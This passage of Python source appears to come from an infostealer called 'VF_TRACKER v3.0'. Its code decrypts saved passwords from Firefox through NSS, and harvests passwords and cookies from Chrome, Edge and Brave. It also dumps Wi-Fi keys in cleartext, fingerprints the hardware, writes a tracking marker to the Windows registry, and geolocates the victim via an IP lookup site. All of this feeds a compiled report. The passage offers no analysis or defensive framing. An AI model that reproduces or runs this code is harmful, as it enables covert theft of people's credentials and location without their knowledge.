            os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'Mozilla Firefox'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Mozilla Firefox'),
        ]
        for d in ff_dirs:
            p = os.path.join(d, 'nss3.dll')
            if os.path.exists(p):
                nss3_path = p
                break
    else:
        lib_paths = [
            '/usr/lib/x86_64-linux-gnu/libnss3.so',
            '/usr/lib/libnss3.so',
            '/usr/lib64/libnss3.so',
        ]
        for p in lib_paths:
            if os.path.exists(p):
                nss3_path = p
                break
        if not nss3_path:
            lib_path = ctypes.util.find_library('nss3')
            if lib_path:
                nss3_path = lib_path

    if not nss3_path:
        return None

    try:
        if IS_WINDOWS and os.path.dirname(nss3_path) not in os.environ.get('PATH', ''):
            os.environ['PATH'] = os.path.dirname(nss3_path) + ';' + os.environ.get('PATH', '')
        nss = ctypes.cdll.LoadLibrary(nss3_path)
    except Exception:
        return None

    # SECItem structure for NSS
    class SECItem(ctypes.Structure):
        _fields_ = [
            ("type", ctypes.c_uint),
            ("data", ctypes.POINTER(ctypes.c_ubyte)),
            ("len", ctypes.c_uint),
        ]

    try:
        # Initialize NSS with the profile directory
        nss.NSS_Init.argtypes = [ctypes.c_char_p]
        nss.NSS_Init.restype = ctypes.c_int
        nss.NSS_Shutdown.argtypes = []
        nss.NSS_Shutdown.restype = ctypes.c_int

        profile_bytes = profile_path.encode('utf-8') if isinstance(profile_path, str) else profile_path
        init_result = nss.NSS_Init(profile_bytes)
        if init_result != 0:
            # Try with "sql:" prefix (newer Firefox uses SQL cipher)
            init_result = nss.NSS_Init(b"sql:" + profile_bytes)
            if init_result != 0:
                return None

        # Set up PK11SDR_Decrypt
        nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
        nss.PK11SDR_Decrypt.restype = ctypes.c_int

        # Input
        enc_buf = (ctypes.c_ubyte * len(raw_data))(*raw_data)
        input_item = SECItem()
        input_item.type = 0  # siBuffer
        input_item.data = ctypes.cast(enc_buf, ctypes.POINTER(ctypes.c_ubyte))
        input_item.len = len(raw_data)

        # Output
        output_item = SECItem()
        output_item.type = 0
        output_item.data = None
        output_item.len = 0

        # Decrypt
        result = nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)

        decrypted = None
        if result == 0 and output_item.data and output_item.len > 0:
            decrypted = ctypes.string_at(output_item.data, output_item.len).decode('utf-8', errors='replace')

        nss.NSS_Shutdown()
        return decrypted

    except Exception:
        try:
            nss.NSS_Shutdown()
        except Exception:
            pass
        return None


def _try_firefox_dpapi_decrypt(enc_data_b64):
    """Try Windows DPAPI for Firefox decryption (older versions)."""
    if not IS_WINDOWS:
        return None
    try:
        import win32crypt
        raw = base64.b64decode(enc_data_b64)
        dec = win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
        return dec.decode('utf-8', errors='replace')
    except Exception:
        return None


def harvest_firefox_passwords():
    """[CRED-3] Extract saved passwords from Mozilla Firefox with NSS decryption."""
    results = []

    if IS_WINDOWS:
        profile_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            'Mozilla', 'Firefox', 'Profiles'
        )
    else:
        profile_dir = os.path.expanduser('~/.mozilla/firefox')

    if not os.path.isdir(profile_dir):
        return [{"browser": "Firefox", "info": "Profile directory not found"}]

    # Find all Firefox profiles (prioritize default-release)
    profiles = []
    for d in os.listdir(profile_dir):
        full = os.path.join(profile_dir, d)
        if os.path.isdir(full) and (d.endswith('.default-release') or d.endswith('.default') or d.endswith('.esr')):
            profiles.append(full)

    if not profiles:
        for d in os.listdir(profile_dir):
            full = os.path.join(profile_dir, d)
            if os.path.isdir(full):
                profiles.append(full)

    for profile in profiles[:5]:
        logins_path = os.path.join(profile, 'logins.json')
        key4_path = os.path.join(profile, 'key4.db')

        if not os.path.exists(logins_path):
            continue

        has_key4 = os.path.exists(key4_path)

        try:
            with open(logins_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)

            if 'logins' not in logins_data:
                continue

            # Test if NSS decryption works for this profile
            nss_works = False
            if has_key4:
                try:
                    test_result = _try_firefox_nss_decrypt(profile, "dGVzdA==")
                    # Even if decryption fails for test data, NSS init might work
                    nss_works = True
                except Exception:
                    nss_works = False

            for login in logins_data['logins']:
                url = login.get('hostname', 'N/A')
                enc_username = login.get('encryptedUsername', '')
                enc_password = login.get('encryptedPassword', '')
                plain_username = login.get('username', '')

                decrypted_pw = None
                decrypted_user = None

                # Strategy 1: NSS decryption via ctypes (best approach)
                if has_key4 and nss_works and enc_password:
                    try:
                        dec = _try_firefox_nss_decrypt(profile, enc_password)
                        if dec:
                            decrypted_pw = dec
                    except Exception:
                        pass
                    if enc_username:
                        try:
                            dec = _try_firefox_nss_decrypt(profile, enc_username)
                            if dec:
                                decrypted_user = dec
                        except Exception:
                            pass

                # Strategy 2: Windows DPAPI (older Firefox)
                if decrypted_pw is None and IS_WINDOWS and enc_password:
                    try:
                        dec = _try_firefox_dpapi_decrypt(enc_password)
                        if dec:
                            decrypted_pw = dec
                    except Exception:
                        pass
                    if enc_username and decrypted_user is None:
                        try:
                            dec = _try_firefox_dpapi_decrypt(enc_username)
                            if dec:
                                decrypted_user = dec
                        except Exception:
                            pass

                # Use plaintext username if available
                if plain_username:
                    decrypted_user = plain_username

                # Fallback markers
                if decrypted_pw is None:
                    if not has_key4:
                        decrypted_pw = "[NO_KEY4_DB]"
                    elif not nss_works:
                        decrypted_pw = "[NSS_NOT_AVAILABLE]"
                    else:
                        decrypted_pw = "[NSS_ENCRYPTED]"
                if decrypted_user is None:
                    decrypted_user = "[ENCRYPTED]"

                results.append({
                    "browser": "Firefox",
                    "profile": os.path.basename(profile),
                    "url": url,
                    "username": decrypted_user,
                    "password": decrypted_pw,
                    "enc_available": bool(enc_password)
                })

        except Exception as e:
            results.append({
                "browser": "Firefox",
                "profile": os.path.basename(profile),
                "url": "ERROR",
                "username": str(e),
                "password": ""
            })

    return results


def harvest_edge_passwords():
    """[CRED-4] Extract saved passwords from Microsoft Edge (Chromium-based).
    v3: scans ALL profiles."""
    if IS_WINDOWS:
        base = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data')
    else:
        base = os.path.expanduser('~/.config/microsoft-edge')

    if not os.path.isdir(base):
        return [{"browser": "Edge", "info": "Edge User Data not found"}]

    return _harvest_chromium_all(base, "edge", "Edge")


def harvest_brave_passwords():
    """[CRED-4b] Extract saved passwords from Brave Browser (Chromium-based).
    v3: scans ALL profiles."""
    if IS_WINDOWS:
        base = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                           'BraveSoftware', 'Brave-Browser', 'User Data')
    else:
        base = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser')

    if not os.path.isdir(base):
        return [{"browser": "Brave", "info": "Brave User Data not found"}]

    return _harvest_chromium_all(base, "brave", "Brave")


def harvest_all_credentials():
    """[CRED-5] Master function: Harvest credentials from all browsers."""
    all_creds = {
        "chrome_passwords": [],
        "chrome_cookies_count": 0,
        "firefox_passwords": [],
        "edge_passwords": [],
        "brave_passwords": [],
        "summary": {}
    }

    # Chrome passwords
    try:
        chrome_pw = harvest_chrome_passwords()
        all_creds["chrome_passwords"] = chrome_pw[:100]
        all_creds["summary"]["chrome_passwords"] = len(chrome_pw)
    except Exception as e:
        all_creds["summary"]["chrome_error"] = str(e)

    # Chrome cookies (count only to keep data small)
    try:
        chrome_cookies = harvest_chrome_cookies()
        all_creds["chrome_cookies_count"] = len(chrome_cookies)
        all_creds["summary"]["chrome_cookies"] = len(chrome_cookies)
        interesting = [c for c in chrome_cookies if not c.get('domain', '').startswith('.')][:50]
        all_creds["chrome_cookies_sample"] = interesting
    except Exception as e:
        all_creds["summary"]["chrome_cookies_error"] = str(e)

    # Firefox passwords
    try:
        ff_pw = harvest_firefox_passwords()
        all_creds["firefox_passwords"] = ff_pw[:100]
        all_creds["summary"]["firefox_passwords"] = len(ff_pw)
        # Count successfully decrypted Firefox passwords
        ff_decrypted = sum(1 for p in ff_pw if not p.get('password', '').startswith('['))
        all_creds["summary"]["firefox_decrypted"] = ff_decrypted
    except Exception as e:
        all_creds["summary"]["firefox_error"] = str(e)

    # Edge passwords
    try:
        edge_pw = harvest_edge_passwords()
        all_creds["edge_passwords"] = edge_pw[:100]
        all_creds["summary"]["edge_passwords"] = len(edge_pw)
    except Exception as e:
        all_creds["summary"]["edge_error"] = str(e)

    # Brave passwords
    try:
        brave_pw = harvest_brave_passwords()
        all_creds["brave_passwords"] = brave_pw[:100]
        all_creds["summary"]["brave_passwords"] = len(brave_pw)
    except Exception as e:
        all_creds["summary"]["brave_error"] = str(e)

    return all_creds



# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3 (CONT): MACHINE ID & REGISTRY MARKER
# ═══════════════════════════════════════════════════════════════════════════════

def generate_machine_id(hwid):
    """[MID-1] Generate a short Machine ID for quick identification."""
    return hashlib.md5(hwid.encode('utf-8')).hexdigest()[:16].upper()


def save_registry_marker(machine_id):
    """[MID-2] Save a marker in Windows Registry for re-identification."""
    if not IS_WINDOWS:
        return False, "N/A (Windows only)"
    try:
        result = subprocess.run(
            ['reg', 'add', 'HKLM\\SOFTWARE\\STORM_VX',
             '/v', 'MachineID', '/t', 'REG_SZ', '/d', machine_id, '/f'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return True, "Marker saved"
        return False, "Failed (needs Admin)"
    except Exception as e:
        return False, str(e)


def check_existing_marker():
    """[MID-3] Check if this machine was already tracked before."""
    if not IS_WINDOWS:
        return None, "N/A"
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\STORM_VX', '/v', 'MachineID'],
            capture_output=True, text=True, timeout=3
        )
        match = re.search(r'REG_SZ\s+(\S+)', result.stdout)
        if match:
            return match.group(1), "Previously tracked"
        return None, "First time"
    except Exception:
        return None, "First time (or access denied)"


def generate_maps_link(lat, lon):
    """[MID-4] Generate Google Maps link from coordinates."""
    if lat and lon and lat not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and lon not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635"):
        return f"https://www.google.com/maps?q={lat},{lon}"
    return "N/A"


# ═══════════════════════════════════════════════════════════════════════════════
# ORIGINAL FUNCTIONS (kept from v1)
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin():
    try:
        if IS_WINDOWS:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "Error"


def get_mac_address():
    mac = uuid.getnode()
    return ":".join([f"{(mac >> elements) & 0xff:02x}" for elements in range(0, 8*6, 8)][::-1])


def get_os_info():
    os_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    processor = platform.processor()
    arch = platform.machine()
    os_str = f"{os_name} {os_release} ({arch})"
    cpu_str = f"{processor if processor else 'Unknown'}"
    return os_str, cpu_str


def get_system_uptime():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['wmic', 'os', 'get', 'LastBootUpTime'],
                                    capture_output=True, text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
            if len(lines) > 1:
                boot_time_str = lines[1]
                if boot_time_str:
                    return f"{boot_time_str[0:4]}/{boot_time_str[4:6]}/{boot_time_str[6:8]} - {boot_time_str[8:10]}:{boot_time_str[10:12]}"
        else:
            result = subprocess.run(['uptime', '-s'], capture_output=True, text=True, timeout=5)
            if result.stdout.strip():
                return result.stdout.strip()
        return "Not supported on this OS"
    except Exception:
        return "Error retrieving"


def get_hardware_resources():
    info = {}
    try:
        if IS_WINDOWS:
            mem_cmd = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'],
                                     capture_output=True, text=True, timeout=5)
            mem_lines = [l.strip() for l in mem_cmd.stdout.split('\n')
                         if l.strip() and 'TotalVisible' not in l]
            if mem_lines:
                parts = mem_lines[0].split()
                if len(parts) >= 2:
                    info['RAM'] = f"Total: {int(parts[0])/1024:.1f} GB | Free: {int(parts[1])/1024:.1f} GB"
            disk_cmd = subprocess.run(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'],
                                      capture_output=True, text=True, timeout=5)
            for line in disk_cmd.stdout.split('\n'):
                if 'C:' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        info['Disk C:'] = f"Total: {int(parts[2])/(1024**3):.1f} GB | Free: {int(parts[1])/(1024**3):.1f} GB"
                        break
        else:
            try:
                with open('/proc/meminfo', 'r') as f:
                    meminfo = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            meminfo[parts[0].rstrip(':')] = int(parts[1])
                    total = meminfo.get('MemTotal', 0) / 1024
                    free = meminfo.get('MemAvailable', meminfo.get('MemFree', 0)) / 1024
                    info['RAM'] = f"Total: {total:.1f} GB | Free: {free:.1f} GB"
            except Exception:
                pass
        return info if info else {"Status": "No information found"}
    except Exception:
        return {"Error": "Failed to retrieve hardware info"}


def get_default_gateway():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True,
                                    timeout=5, encoding='utf-8')
            match = re.search(r'Default Gateway\.+:\s*([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
        else:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
            match = re.search(r'default via ([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
    except Exception:
        return "Error"


def get_active_connections():
    try:
        command = 'netstat -ano' if IS_WINDOWS else 'ss -tulpn'
        result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        established = [line.strip() for line in result.stdout.split('\n')
                       if 'ESTABLISHED' in line]
        return established[:5]
    except Exception:
        return ["Error retrieving connections"]


def get_arp_table():
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        devices = [line.strip() for line in result.stdout.split('\n')
                   if re.search(r'\d+\.\d+\.\d+\.\d+', line)]
        return devices[:5]
    except Exception:
        return ["ARP access blocked"]


def get_firewall_status():
    if not IS_WINDOWS:
        return ["Only supported on Windows"]
    try:
        result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                capture_output=True, text=True, timeout=5, encoding='utf-8')
        profiles = [line.strip() for line in result.stdout.split('\n')
                    if 'ON' in line or 'OFF' in line]
        return profiles if profiles else ["Error retrieving"]
    except Exception:
        return ["Requires Admin access"]


def get_wifi_passwords():
    if not IS_WINDOWS:
        return [("Non-Windows OS", "This feature is only supported on Windows")]
    wifi_list = []
    try:
        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                       capture_output=True, text=True, timeout=5,
                                       encoding='utf-8', errors='replace')
        profile_names = re.findall(r':\s+(.+)\s*$', profiles_cmd.stdout, re.MULTILINE)
        for name in profile_names:
            detail_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profile',
                                          f'name={name}', 'key=clear'],
                                         capture_output=True, text=True, timeout=5,
                                         encoding='utf-8', errors='replace')
            password_match = re.search(r'\u0645\u062d\u062a\u0648\u0627\u06cc \u06a9\u0644\u06cc\u062f\s*:\s*(.+)\s*$',
                                       detail_cmd.stdout, re.MULTILINE)
            if not password_match:
                password_match = re.search(r'Key Content\s*:\s*(.+)\s*$',
                                           detail_cmd.stdout, re.MULTILINE)
            password = password_match.group(1) if password_match else "(No access / Open)"
            wifi_list.append((name.strip(), password.strip()))
    except Exception as e:
        return [("Error", str(e))]
    return wifi_list


def get_info_from_numberia():
    """
    Public IP & geolocation from ipnumberia.com.
    Supports both English and Persian labels (Farsi).
    Uses multi-strategy coordinate extraction to handle any page format.
    """
    url = "https://ipnumberia.com/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    req = urllib.request.Request(url, headers=headers)
    ctx = ssl._create_unverified_context()

    public_ip = "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"     # یافت نشد
    isp = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
    country = "\u0646\u0627\u0645\u0634\u062e\u0635"               # نامشخص
    city = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
    coords = "\u0646\u0627\u0645\u0634\u062e\u0635"                 # نامشخص

    try:
        response = urllib.request.urlopen(req, timeout=10, context=ctx)
        html = response.read().decode('utf-8')

        # ─── 1. Find Public IP ───
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', html)
        if ip_match:
            public_ip = ip_match.group(0)

            # ─── 2. Context window around IP (for country, city, ISP) ───
            start = max(0, ip_match.start() - 2000)
            end = min(len(html), ip_match.end() + 2000)
            context_html = html[start:end]

            # Clean HTML tags in context slice
            clean_text = re.sub(r'<[^>]+>', ' ', context_html)
            clean_text = re.sub(r'\s+', ' ', clean_text)

            # ─── 3. Extract Country (English + Persian labels) ───
            c_match = re.search(
                r'(?:\u06a9\u0634\u0648\u0631|Country)\s*:?\s*([^\s,<]{2,30})',
                clean_text, re.IGNORECASE)
            if c_match:
                country = c_match.group(1)

            # ─── 4. Extract City (English + Persian labels) ───
            city_match = re.search(
                r'(?:\u0634\u0647\u0631|City|\u0627\u0633\u062a\u0627\u0646|Province)\s*:?\s*([^\s,<]{2,30})',
                clean_text, re.IGNORECASE)
            if city_match:
                city = city_match.group(1)

            # ─── 5. Extract Coordinates — Multi-Strategy ───
            # Also clean the FULL page for coordinate search (coords might be far from IP)
            full_clean = re.sub(r'<[^>]+>', ' ', html)
            full_clean = re.sub(r'\s+', ' ', full_clean)

            coords = _extract_coordinates(clean_text, full_clean)

            # ─── 6. Extract ISP (English + Persian labels) ───
            # ipnumberia uses various labels: ISP, ارائه دهنده, سرویس دهنده,
            # شرکت, اپراتور, Provider, Organization, ASN
            isp_patterns = [
                # Table-row format: label ... value (with possible HTML remnants)
                r'(?:ISP|Provider|Organization|ASN|Network)\s*.*?([\w\u0600-\u06FF\s\-\.&]{3,60})',
                r'(?:\u0627\u0631\u0627\u0626\u0647\s?\u062f\u0647\u0646\u062f\u0647|'  # ارائه دهنده
                r'\u0633\u0631\u0648\u06cc\u0633\s?\u062f\u0647\u0646\u062f\u0647|'      # سرویس دهنده
                r'\u0634\u0631\u06a9\u062a|'                                              # شرکت
                r'\u0627\u067e\u0631\u0627\u062a\u0648\u0631|'                            # اپراتور
                r'\u0634\u0628\u06a9\u0647)'                                              # شبکه
                r'\s*.*?([\w\u0600-\u06FF\s\-\.&]{3,60})',
            ]
            for pat in isp_patterns:
                isp_match = re.search(pat, clean_text, re.IGNORECASE)
                if isp_match:
                    candidate = isp_match.group(1).strip()
                    # Filter out non-ISP matches (too short or looks like HTML)
                    if len(candidate) >= 3 and '<' not in candidate:
                        isp = candidate
                        break

            # Fallback: keyword matching (Persian + English)
            if isp == "\u0646\u0627\u0645\u0634\u062e\u0635":  # نامشخص
                isp_keywords = [
                    '\u0627\u06cc\u0631\u0627\u0646\u0633\u0644',     # ایرانسل
                    '\u0645\u062e\u0627\u0628\u0631\u0627\u062a',     # مخابرات
                    '\u0634\u0627\u062a\u0644',                       # شاتل
                    '\u0631\u0627\u06cc\u062a\u0644',                 # رایتل
                    '\u0632\u06cc\u0631\u0633\u0627\u062e\u062a',     # زیرساخت
                    '\u067e\u0627\u0631\u0633 \u0622\u0646\u0644\u0627\u06cc\u0646',  # پارس آنلاین
                    '\u0647\u0627\u06cc\u200c\u0648\u0628',           # های‌وب
                    '\u0627\u0641\u0631\u0627\u0646\u062a',           # افرانت
                    'Irancell', 'Mokhaberat', 'Shatel', 'Rightel',
                    'Pars Online', 'HiWeb', 'Afranet', 'Iran Cell',
                    'ADATA', 'Mobile Communication', 'TP', 'MCI',
                    'Telecommunication', 'Infrastructure'
                ]
                for kw in isp_keywords:
                    if kw.lower() in clean_text.lower():
                        isp = kw
                        break

        return public_ip, isp, country, city, coords

    except Exception as e:
        return public_ip, str(e), "\u062e\u0637\u0627", "\u062e\u0637\u0627", "\u062e\u0637\u0627"


def _extract_coordinates(context_text, full_text):
    """
    Extract geographic coordinates from ipnumberia.com text using multiple strategies.

    ipnumberia.com puts latitude and longitude in SEPARATE table rows:
      <tr><th>عرض جغرافیایی</th><td>35.689234</td></tr>
      <tr><th>طول جغرافیایی</th><td>51.389056</td></tr>

    Strategy 0: Separate-row table extraction (ipnumberia-specific)
    Strategy 1: Labeled patterns (Lat/Lon keywords in English/Persian on same line)
    Strategy 2: Simple decimal pairs (comma or space separated, with optional degree)
    Strategy 3: Smart pair detection (find two decimals that look like coordinates)
    Strategy 4: Concatenated numbers detection
    """
    # Search in both context and full page
    search_texts = [context_text, full_text]

    for text in search_texts:
        # ─── Strategy 0: Separate-row extraction (ipnumberia.com format) ───
        # Persian: عرض جغرافیایی / عرض‌جغرافیایی (with ZWNJ) ... 35.689234
        lat_match = re.search(
            r'(?:\u0639\u0631\u0636[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc[\s\u200c]*\u0627\u06cc\u06cc|'
            r'\u0639\u0631\u0636[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc|'
            r'Latitude|Lat)\s*.*?(-?\d{1,3}\.\d+)',
            text, re.IGNORECASE)
        lon_match = re.search(
            r'(?:\u0637\u0648\u0644[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc[\s\u200c]*\u0627\u06cc\u06cc|'
            r'\u0637\u0648\u0644[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc|'
            r'Longitude|Lon|Lng)\s*.*?(-?\d{1,3}\.\d+)',
            text, re.IGNORECASE)
        if lat_match and lon_match:
            lat_val = lat_match.group(1)
            lon_val = lon_match.group(1)
            # Validate: latitude should be -90 to 90, longitude -180 to 180
            try:
                lat_f = float(lat_val)
                lon_f = float(lon_val)
                if -90 <= lat_f <= 90 and -180 <= lon_f <= 180:
                    return f"{lat_val}, {lon_val}"
            except ValueError:
                pass

        # ─── Strategy 1: Labeled coordinates on same line ───
        labeled_patterns = [
            # English: Latitude: X, Longitude: Y
            r'(?:Latitude|Lat)\s*[:：]?\s*(-?\d{1,3}\.\d+)\s*[°]?\s*.{0,15}?(?:Longitude|Lon|Lng)\s*[:：]?\s*(-?\d{1,3}\.\d+)',
            # Coordinates label
            r'(?:Coordinates?|\u0645\u062e\u062a\u0635\u0627\u062a|\u0645\u0648\u0642\u0639\u06cc\u062a)\s*[:：]?\s*(-?\d{1,3}\.\d+)\s*[°]?\s*[,،\s]\s*(-?\d{1,3}\.\d+)',
        ]
        for pat in labeled_patterns:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return f"{m.group(1)}, {m.group(2)}"

        # ─── Strategy 2: Decimal pair with comma/space separator ───
        pair_patterns = [
            r'(-?\d{2}\.\d+)\s*[°]?\s*[,،]\s*(-?\d{2,3}\.\d+)',         # Comma separated
            r'(-?\d{2}\.\d+)\s*[°]?\s+[NS]\s*[,،]?\s*(-?\d{2,3}\.\d+)', # N/S, then E/W
        ]
        for pat in pair_patterns:
            m = re.search(pat, text)
            if m:
                return f"{m.group(1)}, {m.group(2)}"

        # ─── Strategy 3: Smart pair detection ───
        all_decimals = re.findall(r'(-?\d{1,3}\.\d{1,6})', text)
        for i in range(len(all_decimals) - 1):
            try:
                val1 = float(all_decimals[i])
                val2 = float(all_decimals[i + 1])
                # Iran-specific range (most common use case)
                if 24 <= val1 <= 42 and 43 <= val2 <= 64:
                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
                # Global range
                if -90 <= val1 <= 90 and -180 <= val2 <= 180 and abs(val2 - val1) > 3:
                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
            except (ValueError, IndexError):
                pass

    # ─── Strategy 4: Concatenated numbers ───
    m = re.search(r'(-?\d{2})\.(\d{4,6})(-?\d{2,3})\.(\d{4,6})', full_text)
    if m:
        lat_val = f"{m.group(1)}.{m.group(2)}"
        lon_val = f"{m.group(3)}.{m.group(4)}"
        try:
            if -90 <= float(lat_val) <= 90 and -180 <= float(lon_val) <= 180:
                return f"{lat_val}, {lon_val}"
        except ValueError:
            pass

    return "\u0646\u0627\u0645\u0634\u062e\u0635"  # نامشخص


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT BUILDER v3 — Comprehensive Report
# ═══════════════════════════════════════════════════════════════════════════════

def build_report(output_path=None, silent=False):
    """
    Build the full system tracker report with all phases.
    Returns: (output_path, report_text, report_data_dict)
    """
    def log(msg):
        if not silent:
            print(msg)

    if output_path is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(script_dir, "VF_TRACKER_REPORT.txt")

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_status = "YES (Admin)" if is_admin() else "NO (Limited)"

    log(f"\n{'='*70}")
    log(f"  VF_TRACKER v3.0 - Collecting system information...")
    log(f"  Time: {timestamp}")
    log(f"{'='*70}\n")

    # ─── Phase 1: Hardware Fingerprint ───
    log("  [1/8] Collecting hardware fingerprint...")
    motherboard = get_motherboard_serial()
    bios_uuid = get_bios_uuid()
    cpu_id = get_cpu_processor_id()
    disk_serial = get_disk_serial()
    gpu_list = get_gpu_info()
    battery = get_battery_info()
    mac_addr = get_mac_address()
    hwid = generate_hwid(motherboard, bios_uuid, cpu_id, disk_serial, mac_addr)
    machine_id = generate_machine_id(hwid)

    # ─── Phase 1.5: OS & Basic ───
    os_info, cpu_info = get_os_info()
    hw_info = get_hardware_resources()
    uptime = get_system_uptime()
    hostname = socket.gethostname()

    # ─── Phase 2: User Identity ───
    log("  [2/8] Collecting user identity...")
    username = get_windows_username()
    fullname = get_user_fullname()
    last_login = get_last_login()
    users_list = get_installed_users()
    domain_wg = get_domain_workgroup()
    tz_locale = get_timezone_locale()
    kb_layout = get_keyboard_layout()

    # ─── Phase 2.5: Environment ───
    log("  [3/8] Detecting environment...")
    programs = get_installed_programs()
    processes = get_running_processes()
    antivirus = get_antivirus_info()
    vm_detection = detect_vm_sandbox()
    vpn_proxy = detect_vpn_proxy()

    # ─── Phase 3: Deep Network ───
    log("  [4/8] Collecting network information...")
    local_ip = get_local_ip()
    gateway = get_default_gateway()
    wifi_ssid, wifi_signal = get_current_wifi_info()
    wifi_profiles = get_all_wifi_profiles()
    dns_servers = get_dns_servers()
    dhcp_server = get_dhcp_server()
    adapters = get_all_network_adapters()
    proxy_settings = get_proxy_settings()
    firewall = get_firewall_status()
    wifi_passwords = get_wifi_passwords()
    connections = get_active_connections()
    arp_devices = get_arp_table()

    # ─── Phase 3.5: Public IP ───
    log("  [5/8] Retrieving public IP & geolocation...")
    pub_ip, isp, country, city, coords = get_info_from_numberia()

    # Parse coordinates for maps link
    maps_link = "N/A"
    if coords and coords not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and ',' in coords:
        try:
            parts = coords.split(',')
            maps_link = generate_maps_link(parts[0].strip(), parts[1].strip())
        except Exception:
            pass

    # ─── Phase 5: Credential Harvester ───
    log("  [6/8] Harvesting browser credentials...")
    credentials = harvest_all_credentials()

    # ─── Phase 4: Machine ID ───
    log("  [7/8] Registering machine ID...")
    log("  [8/8] Saving machine marker...")
    existing_marker, marker_status = check_existing_marker()
    is_new_machine = existing_marker is None
    marker_saved, marker_msg = save_registry_marker(machine_id)

    # ═══ BUILD TXT REPORT ═══
    lines = []
    sep = "=" * 70
    sep2 = "-" * 70

    lines.append(sep)
    lines.append(f"  VF_TRACKER v3.0 REPORT")
    lines.append(f"  Generated    : {timestamp}")
    lines.append(f"  Admin Access  : {admin_status}")
    lines.append(f"  Machine ID    : {machine_id}")
    lines.append(f"  HWID          : {hwid[:32]}...")
    lines.append(f"  Status        : {'NEW MACHINE' if is_new_machine else f'Known (first ID: {existing_marker})'}")
    lines.append(sep)

    # ── Section 1: Hardware Fingerprint ──
    lines.append("")
    lines.append(f"  {'[HARDWARE FINGERPRINT]':^70}")
    lines.append(sep2)
    lines.append(f"  [HW] Motherboard Serial  : {motherboard}")
    lines.append(f"  [HW] BIOS UUID           : {bios_uuid}")
    lines.append(f"  [HW] CPU Processor ID    : {cpu_id}")
    lines.append(f"  [HW] Disk Drive Serial   : {disk_serial}")
    lines.append(f"  [HW] MAC Address         : {mac_addr}")
    lines.append(f"  [HW] Battery             : {battery}")
    if isinstance(gpu_list, list):
        for i, gpu in enumerate(gpu_list):
            lines.append(f"  [HW] GPU #{i+1}              : {gpu}")
    else:
        lines.append(f"  [HW] GPU                 : {gpu_list}")
    lines.append(f"  [HW] HWID (SHA256)       : {hwid}")
    lines.append(f"  [HW] Machine ID          : {machine_id}")
    lines.append(f"  [HW] Registry Marker     : {marker_msg}")

    # ── Section 2: System & OS ──
    lines.append("")
    lines.append(f"  {'[SYSTEM & OS]':^70}")
    lines.append(sep2)
    lines.append(f"  [SYS] Hostname           : {hostname}")
    lines.append(f"  [SYS] Operating System   : {os_info}")
    lines.append(f"  [SYS] Processor          : {cpu_info}")
    lines.append(f"  [SYS] Last Restart       : {uptime}")
    if 'RAM' in hw_info:
        lines.append(f"  [SYS] RAM                : {hw_info['RAM']}")
    if 'Disk C:' in hw_info:
        lines.append(f"  [SYS] Drive C:           : {hw_info['Disk C:']}")

    # ── Section 3: User Identity ──
    lines.append("")
